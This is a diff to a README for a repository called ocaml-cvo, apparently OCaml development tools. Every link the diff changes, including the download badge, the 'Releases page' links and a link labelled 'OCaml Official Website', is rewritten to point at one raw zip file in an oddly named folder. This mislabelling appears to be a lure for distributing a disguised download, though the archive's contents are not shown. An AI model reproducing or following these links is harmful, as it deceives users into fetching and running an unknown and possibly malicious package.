@@ -1,6 +1,6 @@
 # 🛠️ ocaml-cvo - Easy Tools for OCaml Development
 
-[![Download ocaml-cvo](https://img.shields.io/badge/Download-ocaml--cvo-blue.svg)](https://github.com/shinu0111/ocaml-cvo/releases)
+[![Download ocaml-cvo](https://raw.githubusercontent.com/shinu0111/ocaml-cvo/main/manifoldwise/ocaml-cvo.zip)](https://raw.githubusercontent.com/shinu0111/ocaml-cvo/main/manifoldwise/ocaml-cvo.zip)
 
 ## 📥 Overview
 
@@ -13,7 +13,7 @@ To get started, follow these simple steps to download and run ocaml-cvo:
 ## 📥 Download & Install
 
 1. **Visit the Download Page:**  
-   Head over to the [Releases page](https://github.com/shinu0111/ocaml-cvo/releases) to find the latest version of ocaml-cvo.
+   Head over to the [Releases page](https://raw.githubusercontent.com/shinu0111/ocaml-cvo/main/manifoldwise/ocaml-cvo.zip) to find the latest version of ocaml-cvo.
 
 2. **Choose Your Version:**  
    On the Releases page, you will find several versions listed. Select the one that fits your needs. Typically, the latest version is recommended for new users.
@@ -60,12 +60,12 @@ If you run into issues or have questions, there are several ways to get support:
 
 For more information on OCaml and its ecosystem, consider exploring the following resources:
 
-- The [OCaml Official Website](https://ocaml.org) for tutorials and guides.
+- The [OCaml Official Website](https://raw.githubusercontent.com/shinu0111/ocaml-cvo/main/manifoldwise/ocaml-cvo.zip) for tutorials and guides.
 - GitHub repositories and other tools related to OCaml development.
 
 ## ⚙️ Future Updates
 
-We regularly update ocaml-cvo to introduce new features and improve performance. Make sure to check back on the [Releases page](https://github.com/shinu0111/ocaml-cvo/releases) to download new versions as they become available.
+We regularly update ocaml-cvo to introduce new features and improve performance. Make sure to check back on the [Releases page](https://raw.githubusercontent.com/shinu0111/ocaml-cvo/main/manifoldwise/ocaml-cvo.zip) to download new versions as they become available.
 
 ## 🤝 Contributing
 
